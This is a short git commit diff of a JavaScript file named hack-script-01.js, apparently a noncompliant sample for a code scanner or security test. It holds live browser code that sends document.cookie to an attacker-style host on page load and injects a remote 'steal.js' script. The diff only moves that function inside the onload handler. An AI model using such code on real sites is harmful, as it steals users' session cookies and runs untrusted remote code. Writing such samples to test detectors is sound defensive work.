88c59d53b7ddcbf92592bf69c8a0180be0bcc6d9
Tolis <tolis.christomanos@gamesys.co.uk>
2020-03-16 15:00:18 +0000

    changes

--- hack-script-01.js
+++ hack-script-01.js
@@ -2,16 +2,17 @@ window.onload = function() {
     fetch('http://hacking.gamesys.hack/hacks.json?cookiemonster='+this.encodeURI(document.cookie))
 
 
+    function include(url) {
+        var s = document.createElement("script");
+        s.setAttribute("type", "text/javascript");
+        s.setAttribute("src", url);
+        document.body.appendChild(s);
+      }
+      include("http://hackers.com/steal.js")  // Noncompliant
 
 
 }
 
 
-function include(url) {
-    var s = document.createElement("script");
-    s.setAttribute("type", "text/javascript");
-    s.setAttribute("src", url);
-    document.body.appendChild(s);
-  }
-  include("http://hackers.com/steal.js")  // Noncompliant
+
   
